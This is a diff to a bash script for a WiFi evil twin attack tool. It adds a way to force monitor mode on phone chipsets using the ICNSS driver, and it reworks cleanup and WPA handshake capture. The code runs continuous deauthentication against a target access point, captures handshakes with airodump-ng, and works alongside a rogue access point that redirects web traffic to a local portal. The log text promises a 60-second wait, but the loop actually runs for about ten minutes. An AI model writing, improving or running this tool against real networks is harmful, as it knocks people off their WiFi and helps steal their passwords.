@@ -21,6 +21,7 @@ MON_INTERFACE=""
 AP_INTERFACE="wlan2"
 INTERNET_INTERFACE=""
 SELECTED_INTERFACE=""
+ORIGINAL_CON_MODE=""  # Store original ICNSS con_mode
 
 detect_device() {
     local hostname="$1"
@@ -85,9 +86,54 @@ get_monitor_interface() {
     echo ""
 }
 
+# New function for ICNSS monitor mode
+enable_icnss_monitor() {
+    local interface="$1"
+    local con_mode_path="/sys/module/wlan/parameters/con_mode"
+    
+    log_info "Attempting ICNSS monitor mode on $interface..."
+    
+    # Check if con_mode file exists
+    if [ ! -f "$con_mode_path" ]; then
+        log_error "ICNSS con_mode file not found at $con_mode_path"
+        return 1
+    fi
+    
+    # Save original mode for cleanup
+    ORIGINAL_CON_MODE=$(cat "$con_mode_path" 2>/dev/null)
+    log_info "Original con_mode: $ORIGINAL_CON_MODE"
+    
+    # Take interface down
+    ip link set "$interface" down 2>/dev/null
+    
+    # Set monitor mode (4 = monitor)
+    echo "4" > "$con_mode_path" 2>/dev/null
+    if [ $? -ne 0 ]; then
+        log_error "Failed to set con_mode to 4"
+        ip link set "$interface" up 2>/dev/null
+        return 1
+    fi
+    
+    # Bring interface up
+    ip link set "$interface" up 2>/dev/null
+    sleep 2
+    
+    # Verify monitor mode
+    if iw dev "$interface" info 2>/dev/null | grep -q "type monitor"; then
+        log_success "ICNSS monitor mode enabled on $interface (con_mode=4)"
+        echo "$interface"
+        return 0
+    else
+        log_error "Failed to verify monitor mode on $interface"
+        return 1
+    fi
+}
+
 cleanup() {
     echo ""
     log_info "Shutting down attack..."
+    
+    # Kill processes
     pkill -f hostapd 2>/dev/null
     pkill -f dnsmasq 2>/dev/null
     pkill -f airodump-ng 2>/dev/null
@@ -98,12 +144,26 @@ cleanup() {
     fuser -k 80/tcp 2>/dev/null
     [ -n "$DEAUTH_PID" ] && kill $DEAUTH_PID 2>/dev/null
     [ -n "$AP_INTERFACE" ] && iw dev "$AP_INTERFACE" del > /dev/null 2>&1
-    if [ -n "$MON_INTERFACE" ]; then
-        ifconfig "$MON_INTERFACE" down 2>/dev/null
-        iw dev "$MON_INTERFACE" set type managed 2>/dev/null
-        ifconfig "$MON_INTERFACE" up 2>/dev/null
+    
+    # Restore ICNSS original con_mode if it was changed
+    if [ -n "$ORIGINAL_CON_MODE" ] && [ -f "/sys/module/wlan/parameters/con_mode" ]; then
+        log_info "Restoring ICNSS con_mode to $ORIGINAL_CON_MODE"
+        echo "$ORIGINAL_CON_MODE" > /sys/module/wlan/parameters/con_mode 2>/dev/null
     fi
     
+    # Note for user to manually stop monitor mode
+    log_warn "Monitor mode may still be enabled on your interfaces."
+    log_warn "To disable monitor mode manually, use: airmon-ng stop <interface>"
+    log_warn "Or restart your WiFi with: svc wifi disable && svc wifi enable"
+    
+    # iptables restore
+    if [ -f /sdcard/original ]; then
+        log_info "Restoring iptables from /sdcard/original"
+        iptables-restore < /sdcard/original
+        log_success "Iptables restored successfully"
+    fi
+    
+    # iptables cleanup (your existing code)
     while iptables -t nat -D PREROUTING -i "$AP_INTERFACE" -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80 2>/dev/null; do
         :
     done
@@ -148,6 +208,7 @@ cleanup() {
     fi
     rm -f *.pid
     log_success "Cleanup complete"
+    log_warn "Remember to manually disable monitor mode if needed!"
     exit 0
 }
 trap cleanup SIGINT SIGTERM EXIT
@@ -260,20 +321,37 @@ scan_networks() {
     fi
     
     log_info "Setting $SELECTED_INTERFACE to monitor mode..."
-    ifconfig "$SELECTED_INTERFACE" down 2>/dev/null
-    iw dev "$SELECTED_INTERFACE" set type monitor 2>/dev/null
-    ifconfig "$SELECTED_INTERFACE" up 2>/dev/null
-    sleep 2
     
-    MON_INTERFACE=$(get_monitor_interface)
-    if [ -z "$MON_INTERFACE" ]; then
-        log_error "Failed to detect monitor interface!"
-        exit 1
+    # Check if this is an ICNSS interface (built-in phone WiFi)
+    local driver=""
+    if command -v ethtool >/dev/null 2>&1; then
+        driver=$(ethtool -i "$SELECTED_INTERFACE" 2>/dev/null | grep "driver:" | cut -d: -f2 | sed 's/^[[:space:]]*//')
     fi
     
-    if ! iw dev "$MON_INTERFACE" info 2>/dev/null | grep -q "type monitor"; then
-        log_error "$MON_INTERFACE is not in monitor mode!"
-        exit 1
+    if [[ "$driver" == "icnss" || "$driver" == "icnss2" ]]; then
+        log_info "ICNSS driver detected, using special method..."
+        MON_INTERFACE=$(enable_icnss_monitor "$SELECTED_INTERFACE")
+        if [ -z "$MON_INTERFACE" ]; then
+            log_error "Failed to enable ICNSS monitor mode!"
+            exit 1
+        fi
+    else
+        # Standard method for normal drivers
+        ifconfig "$SELECTED_INTERFACE" down 2>/dev/null
+        iw dev "$SELECTED_INTERFACE" set type monitor 2>/dev/null
+        ifconfig "$SELECTED_INTERFACE" up 2>/dev/null
+        sleep 2
+        
+        MON_INTERFACE=$(get_monitor_interface)
+        if [ -z "$MON_INTERFACE" ]; then
+            log_error "Failed to detect monitor interface!"
+            exit 1
+        fi
+        
+        if ! iw dev "$MON_INTERFACE" info 2>/dev/null | grep -q "type monitor"; then
+            log_error "$MON_INTERFACE is not in monitor mode!"
+            exit 1
+        fi
     fi
     
     log_success "Using monitor interface: $MON_INTERFACE"
@@ -327,33 +405,69 @@ capture_handshake() {
     local bssid="$1"
     local channel="$2"
     local ssid="$3"
-    log_info "Capturing handshake..."
-    sudo iwconfig $MON_INTERFACE channel "$channel" 2>/dev/null
+    log_info "Capturing handshake for $ssid on channel $channel..."
+    
+    # Clean old capture files
+    rm -f evil-*.cap /tmp/handshake_check.cap 2>/dev/null
+    
+    # Use iw instead of iwconfig
+    iw dev $MON_INTERFACE set channel "$channel" 2>/dev/null
     sleep 2
+    
     nohup sudo airodump-ng -c "$channel" --bssid "$bssid" -w evil $MON_INTERFACE > /tmp/airodump.log 2>&1 &
     AIRODUMP_PID=$!
     sleep 3
+    
     nohup sudo aireplay-ng -0 0 -a "$bssid" $MON_INTERFACE > /tmp/deauth.log 2>&1 &
     DEAUTH_PID=$!
-    log_info "Deauth running - waiting for handshake..."
+    log_info "Deauth running - waiting for handshake (max 60 seconds)..."
+    
     HANDSAKE_CAPTURED=false
-    for i in {1..60}; do
-        if aircrack-ng evil-01.cap 2>/dev/null | grep -q "1 handshake"; then
-            log_success "Handshake captured!"
-            HANDSAKE_CAPTURED=true
+    
+    # Wait for capture file to be created
+    for i in {1..10}; do
+        if [ -f "evil-01.cap" ]; then
+            log_info "Capture file created"
             break
+        fi
+        sleep 1
+    done
+    
+    # Check for handshake using temp file (fixes corruption issue)
+    for i in {1..60}; do
+        if [ -f "evil-01.cap" ]; then
+            # Copy to temp file to avoid reading live file
+            cp evil-01.cap /tmp/handshake_check.cap 2>/dev/null
+            
+            if aircrack-ng /tmp/handshake_check.cap 2>/dev/null | grep -q "1 handshake"; then
+                log_success "Handshake captured!"
+                HANDSAKE_CAPTURED=true
+                rm -f /tmp/handshake_check.cap
+                break
+            fi
+            rm -f /tmp/handshake_check.cap
+        fi
+        
+        # Show progress every 10 seconds
+        if [ $((i % 6)) -eq 0 ]; then
+            echo -ne "\rWaiting for handshake... $((i/6 * 10)) seconds elapsed"
         fi
         sleep 10
     done
+    echo ""  # New line after progress
+    
+    # Kill airodump
     sudo kill $AIRODUMP_PID 2>/dev/null
     sleep 2
+    
     if [ "$HANDSAKE_CAPTURED" = true ]; then
         HANDSHAKE_FILE="${ssid//[^a-zA-Z0-9]/_}.cap"
         cp evil-01.cap "$HANDSHAKE_FILE"
         log_success "Handshake saved as: $HANDSHAKE_FILE"
+        ls -la "$HANDSHAKE_FILE" | awk '{print "  Size: " $5 " bytes"}'
     else
-        log_warn "No handshake captured - continuing anyway"
-        read -p "Continue? (y/n): " choice
+        log_warn "No handshake captured after 60 seconds"
+        read -p "Continue with evil twin attack anyway? (y/n): " choice
         if [[ ! "$choice" =~ ^[Yy]$ ]]; then
             [ -n "$DEAUTH_PID" ] && kill $DEAUTH_PID 2>/dev/null
             exit 1
